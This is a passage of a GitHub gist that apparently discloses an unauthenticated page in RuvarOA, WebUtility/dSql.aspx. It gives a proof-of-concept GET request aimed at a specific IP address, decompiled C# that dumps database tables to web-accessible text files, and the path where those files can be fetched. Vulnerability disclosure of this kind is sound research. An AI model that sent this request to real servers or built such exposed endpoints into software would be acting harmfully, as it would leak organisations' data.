1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">path</h3><a id="user-content-path-29" class="anchor" aria-label="Permalink: path" href="#path-29"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">WebUtility/dSql.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">POC</h3><a id="user-content-poc-29" class="anchor" aria-label="Permalink: POC" href="#poc-29"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /WebUtility/dSql.aspx HTTP/1.1
Host: 112.74.79.113:8000


</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302594999-7a6a4e99-0552-4063-9f12-1be19d569b4c.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1OTQ5OTktN2E2YTRlOTktMDU1Mi00MDYzLTlmMTItMWJlMTlkNTY5YjRjLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTkxOTYwM2E2OTMzZDkwOTFmNWNmNWMzOTlmNDhlZmEwZjAzZDY0MDkzNzkxMjkzMjcyMjlhMzMzZjU1YjIwOTQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.4Bia1tJ0ghtJvppr1tkQ4WdlZCzg2QENaKQyHN1t3Go"><img width="1392" alt="image-20240127211336204" src="https://private-user-images.githubusercontent.com/18260135/302594999-7a6a4e99-0552-4063-9f12-1be19d569b4c.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1OTQ5OTktN2E2YTRlOTktMDU1Mi00MDYzLTlmMTItMWJlMTlkNTY5YjRjLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTkxOTYwM2E2OTMzZDkwOTFmNWNmNWMzOTlmNDhlZmEwZjAzZDY0MDkzNzkxMjkzMjcyMjlhMzMzZjU1YjIwOTQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.4Bia1tJ0ghtJvppr1tkQ4WdlZCzg2QENaKQyHN1t3Go" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">Vulnerability analysis</h3><a id="user-content-vulnerability-analysis-26" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-26"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function btnMake_Click of calss dSql within the DLL file /RuvarOA/bin/WebUtility.dll</p>
<pre><code>using System;
using System.Data;
using System.IO;
using System.Text;
using System.Web.UI;
using System.Web.UI.HtmlControls;
using System.Web.UI.WebControls;
using Lib;

namespace WebUtility;

public class dSql : Page
{
    protected HtmlForm form1;

    protected Button btnMake;

    protected HtmlInputCheckBox sys_menu;

    protected HtmlInputCheckBox sys_desk_setting;

    protected HtmlInputCheckBox sys_desk_style;

    protected HtmlInputCheckBox sys_property_tree;

    protected HtmlInputCheckBox sys_pagelist_info;

    protected HtmlInputCheckBox sys_pagelist_field;

    protected HtmlInputCheckBox sys_base_field;

    protected HtmlInputCheckBox sys_pageform_info;

    protected HtmlInputCheckBox sys_baseinfo_type;

    protected HtmlInputCheckBox sys_pagelist_search;

    protected HtmlInputCheckBox msg_source;

    protected HtmlInputCheckBox sys_admin_purview;

    protected HtmlInputCheckBox wf_template;

    protected HtmlInputCheckBox wf_template_field;

    protected HtmlInputCheckBox flow_template;

    protected HtmlInputCheckBox flow_field;

    protected void Page_Load(object sender, EventArgs e)
    {
    }

    protected void btnMake_Click(object sender, EventArgs e)
    {
        StringBuilder stringBuilder = new StringBuilder("version:" + DateTime.Now.ToString("yyyyMMdd.hhmm"));
        string text = "";
        string text2 = "";
        string text3 = "\r\n";
        string text4 = "";
        string text5 = ((Page)this).Server.MapPath("/db/" + DateTime.Now.ToString("yyyy-MM-dd"));
        StreamWriter streamWriter = null;
        if (!Directory.Exists(text5))
        {
            Directory.CreateDirectory(text5);
        }
        for (int i = 0; i &lt; ((Control)form1).Controls.Count; i++)
        {
            Control val = ((Control)form1).Controls[i];
            if (val is HtmlInputCheckBox)
            {
                HtmlInputCheckBox val2 = (HtmlInputCheckBox)(object)((val is HtmlInputCheckBox) ? val : null);
                if (val2.Checked)
                {
                    string value = ((HtmlInputControl)val2).Value;
                    stringBuilder.Append(" truncate table " + value + " " + text3);
                    stringBuilder.Append("/* build " + value + " " + DateTime.Now.ToString() + "   */" + text3);
                    string sQLString = "select * from " + value + " ";
                    DataTable dataTable = SqlHelper.QueryTable(sQLString);
                    sQLString = " truncate table " + value + " " + text3;
                    string text6 = sQLString;
                    sQLString = text6 + "/* build " + value + " " + DateTime.Now.ToString() + "   */" + text3;
                    text6 = sQLString;
                    sQLString = text6 + "set IDENTITY_INSERT " + value + " on " + text3;
                    stringBuilder.Append("set IDENTITY_INSERT " + value + " on " + text3);
                    text2 = "";
                    for (int j = 0; j &lt; dataTable.Columns.Count; j++)
                    {
                        text2 = ((!(text2 == "")) ? (text2 + "," + dataTable.Columns[j].ColumnName) : dataTable.Columns[j].ColumnName);
                    }
                    for (int j = 0; j &lt; dataTable.Rows.Count; j++)
                    {
                        text = "if not exists(select * from " + value + " where " + dataTable.Columns[0].ColumnName + "='" + dataTable.Rows[j][dataTable.Columns[0].ColumnName].ToString() + "') ";
                        text6 = text;
                        text = text6 + "insert into " + value + "(" + text2 + ") values (";
                        for (int k = 0; k &lt; dataTable.Columns.Count; k++)
                        {
                            if (k != 0)
                            {
                                text += ",";
                            }
                            text4 = Common.FixQuote(dataTable.Rows[j][dataTable.Columns[k].ColumnName].ToString());
                            if (text4 == "False")
                            {
                                text4 = "0";
                            }
                            if (text4 == "Tree")
                            {
                                text4 = "1";
                            }
                            text = text + "'" + text4 + "'";
                        }
                        text = text + ") " + text3;
                        stringBuilder.Append(text);
                        sQLString += text;
                    }
                    stringBuilder.Append("set IDENTITY_INSERT " + value + " off " + text3);
                    text6 = sQLString;
                    sQLString = text6 + "set IDENTITY_INSERT " + value + " off " + text3;
                    stringBuilder.Append("GO" + text3 + text3);
                    sQLString = sQLString + "GO" + text3 + text3;
                    streamWriter = new StreamWriter(text5 + "\\" + value + ".txt", append: false, Encoding.UTF8);
                    streamWriter.Write(sQLString);
                    streamWriter.Flush();
                    streamWriter.Close();
                    streamWriter.Dispose();
                }
            }
            JS.AlertGoUrl("默认值生成成功!", "/webutility/dSql.aspx");
        }
    }
}

</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302596142-961443ea-5683-48a1-8d8b-f6981a4828d3.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1OTYxNDItOTYxNDQzZWEtNTY4My00OGExLThkOGItZjY5ODFhNDgyOGQzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWRhYjdlZWY4OTc2NDZmZmFlMmZiMjE3ZDhjZTlkMmQ0ZWUxZDQ4NTZiNTkzNTJmYjQwNzNkM2NjZTVhNDY3ZTUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.qVJb-qN3LbVFNLnjrQM02jAmvowQuBgfeDuMyEHvA3Y"><img width="1485" alt="image-20240127211931004" src="https://private-user-images.githubusercontent.com/18260135/302596142-961443ea-5683-48a1-8d8b-f6981a4828d3.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1OTYxNDItOTYxNDQzZWEtNTY4My00OGExLThkOGItZjY5ODFhNDgyOGQzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWRhYjdlZWY4OTc2NDZmZmFlMmZiMjE3ZDhjZTlkMmQ0ZWUxZDQ4NTZiNTkzNTJmYjQwNzNkM2NjZTVhNDY3ZTUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.qVJb-qN3LbVFNLnjrQM02jAmvowQuBgfeDuMyEHvA3Y" style="max-width: 100%;"></a>
<p dir="auto">The log file format is year followed by date, such as 20240127. Access link: <code>/logfiles/20240112.txt</code></p>
</article>
  </div>

  </div>
</div>


        <a name="comments"></a>
        <div class="js-quote-selection-container" data-quote-markdown=".js-comment-body">
          <div class="js-discussion "
          >
            <div class="ml-md-6 pl-md-3 ml-0 pl-0">
              



<!-- Rendered timeline since 2024-05-07 20:23:42 -->
<div id="partial-timeline-marker"
      class="js-timeline-marker js-updatable-content"
      data-last-modified="Wed, 08 May 2024 03:23:42 GMT"
      >
</div>

            </div>

            <div class="discussion-timeline-actions">
              <div data-view-component="true" class="flash flash-warn mt-3">
  
    <a rel="nofollow" class="btn btn-primary" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;signed out comment&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="13f5828bfe9c9017ada225326acecfe461b2ae08a3b102630ba12d3f01dfa754" href="/join?source=comment-gist">Sign up for free</a>
    <strong>to join this conversation on GitHub</strong>.
    Already have an account?
    <a rel="nofollow" class="Link--inTextBlock" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;signed out comment&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="20b0e42d7e8df70650c9a0028253a26d17fa41131229fef320f2468122ae2cf9" data-test-selector="comments-sign-in-link" href="/login?return_to=https%3A%2F%2Fgist.github.com%2FMr-xn%2Fbc8261a5c3e35a72768723acf1da358d">Sign in to comment</a>


  
</div>
            </div>
          </div>
        </div>
</div>
  </div>
</div><!-- /.container -->

    </main>
  </div>

  </div>

          <footer class="footer pt-8 pb-6 f6 color-fg-muted p-responsive" role="contentinfo" >
  <h2 class='sr-only'>Footer</h2>

  


  <div class="d-flex flex-justify-center flex-items-center flex-column-reverse flex-lg-row flex-wrap flex-lg-nowrap">
    <div class="d-flex flex-items-center flex-shrink-0 mx-2">
      <a aria-label="Homepage" title="GitHub" class="footer-octicon mr-2" href="https://github.com">
        <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-mark-github">
    <path d="M12.5.75C6.146.75 1 5.896 1 12.25c0 5.089 3.292 9.387 7.863 10.91.575.101.79-.244.79-.546 0-.273-.014-1.178-.014-2.142-2.889.532-3.636-.704-3.866-1.35-.13-.331-.69-1.352-1.18-1.625-.402-.216-.977-.748-.014-.762.906-.014 1.553.834 1.769 1.179 1.035 1.74 2.688 1.25 3.349.948.1-.747.402-1.25.733-1.538-2.559-.287-5.232-1.279-5.232-5.678 0-1.25.445-2.285 1.178-3.09-.115-.288-.517-1.467.115-3.048 0 0 .963-.302 3.163 1.179.92-.259 1.897-.388 2.875-.388.977 0 1.955.13 2.875.388 2.2-1.495 3.162-1.179 3.162-1.179.633 1.581.23 2.76.115 3.048.733.805 1.179 1.825 1.179 3.09 0 4.413-2.688 5.39-5.247 5.678.417.36.776 1.05.776 2.128 0 1.538-.014 2.774-.014 3.162 0 .302.216.662.79.547C20.709 21.637 24 17.324 24 12.25 24 5.896 18.854.75 12.5.75Z"></path>
</svg>
</a>
      <span>
        &copy; 2025 GitHub,&nbsp;Inc.
      </span>
    </div>

    <nav aria-label="Footer">
      <h3 class="sr-only" id="sr-footer-heading">Footer navigation</h3>

      <ul class="list-style-none d-flex flex-justify-center flex-wrap mb-2 mb-lg-0" aria-labelledby="sr-footer-heading">

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to Terms&quot;,&quot;label&quot;:&quot;text:terms&quot;}" href="https://docs.github.com/site-policy/github-terms/github-terms-of-service" data-view-component="true" class="Link--secondary Link">Terms</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to privacy&quot;,&quot;label&quot;:&quot;text:privacy&quot;}" href="https://docs.github.com/site-policy/privacy-policies/github-privacy-statement" data-view-component="true" class="Link--secondary Link">Privacy</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to security&quot;,&quot;label&quot;:&quot;text:security&quot;}" href="https://github.com/security" data-view-component="true" class="Link--secondary Link">Security</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to status&quot;,&quot;label&quot;:&quot;text:status&quot;}" href="https://www.githubstatus.com/" data-view-component="true" class="Link--secondary Link">Status</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to docs&quot;,&quot;label&quot;:&quot;text:docs&quot;}" href="https://docs.github.com/" data-view-component="true" class="Link--secondary Link">Docs</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to contact&quot;,&quot;label&quot;:&quot;text:contact&quot;}" href="https://support.github.com?tags=dotcom-footer" data-view-component="true" class="Link--secondary Link">Contact</a>
          </li>

          <li class="mx-2" >
  <cookie-consent-link>
    <button
      type="button"
      class="Link--secondary underline-on-hover border-0 p-0 color-bg-transparent"
      data-action="click:cookie-consent-link#showConsentManagement"
      data-analytics-event="{&quot;location&quot;:&quot;footer&quot;,&quot;action&quot;:&quot;cookies&quot;,&quot;context&quot;:&quot;subfooter&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;cookies_link_subfooter_footer&quot;}"
    >
      Manage cookies
    </button>
  </cookie-consent-link>
</li>

<li class="mx-2">
  <cookie-consent-link>
    <button
      type="button"
      class="Link--secondary underline-on-hover border-0 p-0 color-bg-transparent"
      data-action="click:cookie-consent-link#showConsentManagement"
      data-analytics-event="{&quot;location&quot;:&quot;footer&quot;,&quot;action&quot;:&quot;dont_share_info&quot;,&quot;context&quot;:&quot;subfooter&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;dont_share_info_link_subfooter_footer&quot;}"
    >
      Do not share my personal information
    </button>
  </cookie-consent-link>
</li>

      </ul>
    </nav>
  </div>
</footer>




    <ghcc-consent id="ghcc" class="position-fixed bottom-0 left-0" style="z-index: 999999" data-initial-cookie-consent-allowed="" data-cookie-consent-required="true"></ghcc-consent>


  <div id="ajax-error-message" class="ajax-error-message flash flash-error" hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
    </button>
    You can’t perform that action at this time.
  </div>

    <template id="site-details-dialog">
  <details class="details-reset details-overlay details-overlay-dark lh-default color-fg-default hx_rsm" open>
    <summary role="button" aria-label="Close dialog"></summary>
    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast hx_rsm-dialog hx_rsm-modal">
      <button class="Box-btn-octicon m-0 btn-octicon position-absolute right-0 top-0" type="button" aria-label="Close dialog" data-close-dialog>
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
      </button>
      <div class="octocat-spinner my-6 js-details-dialog-spinner"></div>
    </details-dialog>
  </details>
</template>

    <div class="Popover js-hovercard-content position-absolute" style="display: none; outline: none;">
  <div class="Popover-message Popover-message--bottom-left Popover-message--large Box color-shadow-large" style="width:360px;">
  </div>
</div>

    <template id="snippet-clipboard-copy-button">
  <div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0" data-copy-feedback="Copied!" data-tooltip-direction="w">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none m-2">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
    </clipboard-copy>
  </div>
</template>
<template id="snippet-clipboard-copy-button-unpositioned">
  <div class="zeroclipboard-container">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
    </clipboard-copy>
  </div>
</template>




    </div>

    <div id="js-global-screen-reader-notice" class="sr-only mt-n1" aria-live="polite" aria-atomic="true" ></div>
    <div id="js-global-screen-reader-notice-assertive" class="sr-only mt-n1" aria-live="assertive" aria-atomic="true"></div>
  </body>
</html>

